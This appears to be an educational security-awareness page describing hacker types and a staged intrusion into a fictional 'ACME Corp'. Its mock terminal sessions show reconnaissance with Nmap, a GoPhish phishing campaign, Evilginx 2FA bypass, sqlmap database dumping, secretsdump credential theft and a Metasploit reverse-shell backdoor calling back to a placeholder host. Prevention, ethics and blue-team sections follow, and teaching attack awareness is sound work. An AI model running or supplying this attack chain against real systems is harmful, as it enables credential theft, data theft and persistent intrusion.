Types of Hackers

White Hat Hackers
  • Ethical hackers working legally
  • Help organizations improve security
  • Follow strict rules of engagement
  • Certifications: CEH, OSCP, CISSP
Black Hat Hackers
  • Malicious intent for personal gain
  • Steal data, cause damage, disrupt services
  • Operate outside the law
  • Often part of organized crime
Grey Hat Hackers
  • Operate in a legal grey area
  • May break laws but without malicious intent
  • Often expose vulnerabilities publicly
  • Motivated by curiosity or activism

Real-World Example

In 2013, a grey hat hacker discovered a vulnerability in Facebook that allowed access to private photos. Instead of exploiting it, he reported it to Facebook and received a $12,500 bounty.

This demonstrates how ethical behavior can turn hacking skills into a legitimate career.

How Hackers Break Into Systems

Attacker's Perspective

"I need to gain access to ACME Corp's internal network to steal sensitive data. How can I do this?"

1. Information Gathering (Reconnaissance)

The attacker researches the target organization to identify potential vulnerabilities.

Public Information

  • Company website and job postings
  • Social media profiles of employees
  • Domain registration details
  • Public documents and presentations

Technical Recon

  • Network scanning with Nmap
  • Subdomain enumeration
  • Searching for exposed services with Shodan
  • Checking for known vulnerabilities

2. Initial Access

Using gathered information, the attacker attempts to gain a foothold in the system.

Phishing

Crafting convincing emails to trick users into revealing credentials or downloading malware.

Credential Stuffing

Using known password leaks to attempt login on corporate accounts.

Exploiting Vulnerabilities

Taking advantage of unpatched software or misconfigurations.

attacker@phish:~

$ gophish

Starting GoPhish server...

Created phishing campaign targeting HR department

Sent 50 emails with "Password Reset Required" subject

[+] 5 users submitted credentials

3. Privilege Escalation

Once inside, the attacker seeks to gain higher-level permissions.

Horizontal Escalation

Moving to other user accounts with similar privileges but potentially more access.

Vertical Escalation

Gaining administrator or root privileges to access protected resources.

4. Lateral Movement

The attacker explores the network to find valuable data and systems.

attacker@compromised:~

$ whoami

acme\jdoe

$ net view /domain

List of domain controllers...

$ secretsdump.py administrator@dc01

Dumped domain admin credentials!

5. Data Exfiltration

The attacker identifies and extracts valuable data from the network.

Sensitive Data

Customer PII, financial records, intellectual property

Credentials

Domain admin accounts, service accounts, SSH keys

Email Archives

Executive communications, business strategies

Defensive Measures

Prevention

  • Employee security awareness training
  • Multi-factor authentication
  • Regular software patching
  • Network segmentation

Detection

  • SIEM systems for log monitoring
  • Endpoint detection and response (EDR)
  • Anomaly detection
  • Regular penetration testing

Hacker Scenario: From Recon to Exploitation

hacker@terminal:~

1 Information Gathering

$ whois acme-corp.com

Registrar: GoDaddy

Name Servers: ns1.acme-corp.com (192.168.1.1)

Admin Email: admin@acme-corp.com

$ nmap -sV -T4 acme-corp.com

PORT STATE SERVICE VERSION

22/tcp open ssh OpenSSH 7.4

80/tcp open http Apache 2.4.6

443/tcp open ssl/http Apache 2.4.6

The attacker discovers the company uses an outdated Apache version with known vulnerabilities, and finds employee emails through LinkedIn and company website.

2 Phishing Campaign

$ gophish

Creating new campaign...

Template: "IT Security Alert - Password Reset Required"

Targeting: 50 employees from HR and Finance

Landing Page: login.acme-corp[.]com (clone of real site)

[+] 8 credentials captured in first 2 hours

The attacker sets up a convincing phishing page that mimics the company's real login page, complete with SSL certificate and company branding.

3 Credential Capture & 2FA Bypass

$ evilginx -d login.acme-corp.com

Proxy server running on port 443

Captured session cookies with valid 2FA tokens

[+] Successfully bypassed 2FA for user: j.smith (Finance Dept)

Using Evilginx, the attacker bypasses two-factor authentication by intercepting the session cookies after the victim completes the 2FA challenge.

4 Exploitation

$ sqlmap -u "https://acme-corp.com/admin?id=1" --cookie="session=abcd1234" --dbs

Scanning for SQL injection vulnerabilities...

Parameter 'id' is vulnerable

Available databases: acme_prod, mysql

$ sqlmap --dump -D acme_prod -T users

Dumped 2500 user records including hashed passwords

With access to an admin account, the attacker finds and exploits an SQL injection vulnerability in the admin panel to extract the entire user database.

5 Persistence

$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f elf > backup.elf

Payload size: 73802 bytes

$ msfconsole

use msfconsole

use exploit/multi/handler

set payload linux/x64/meterpreter/reverse_tcp

exploit -j

[+] Meterpreter session 1 opened

meterpreter > migrate 1245

Successfully migrated to process 1245 (apache2)

The attacker establishes persistent access by installing a backdoor that connects back to their server, hiding the malicious process within a legitimate web server process.

How This Could Have Been Prevented

Security Awareness

  • Phishing simulation training for employees
  • Clear reporting process for suspicious emails
  • Visual indicators for external emails

Technical Controls

  • Web Application Firewall (WAF) to block SQLi
  • Regular vulnerability scanning and patching
  • Endpoint detection and response (EDR) solutions
  • Network segmentation to limit lateral movement

Ethical Considerations

Legal Authorization

Always obtain written permission before testing any system you don't own.

Scope Definition

Clearly define what systems and techniques are allowed in the engagement.

Data Protection

Handle any discovered sensitive data with extreme care and confidentiality.

Defensive Tools & Blue Team Focus

Defensive Security Tools

SIEM (Security Information and Event Management)

Tools like Splunk, IBM QRadar, and ELK Stack that collect and analyze security data from various sources to detect threats.

EDR (Endpoint Detection and Response)

Solutions like CrowdStrike, Carbon Black, and Microsoft Defender ATP that monitor endpoints for malicious activity.

Next-Gen Firewalls

Palo Alto, Fortinet, and Cisco firewalls with deep packet inspection, intrusion prevention, and application control.

Network Traffic Analysis

Tools like Darktrace and Corelight that use AI to detect anomalies in network behavior.

Email Security

Proofpoint, Mimecast, and Microsoft Defender for Office 365 that filter malicious emails and attachments.

Blue Team Activities

Threat Hunting

Proactively searching through networks to detect and isolate advanced threats that evade existing security solutions.

Alert Triage

Reviewing and prioritizing security alerts to focus on genuine threats while reducing false positives.

Incident Response

Following documented procedures to contain, eradicate, and recover from security incidents.

Security Hardening

Implementing security best practices to reduce the attack surface of systems and applications.

Security Metrics

Measuring and reporting on security posture and effectiveness of security controls.

Final Thoughts

Understanding how hackers think and operate is essential for building effective defenses. The best security professionals can think like attackers while implementing robust defensive measures.

"The best defense is to think like an attacker."
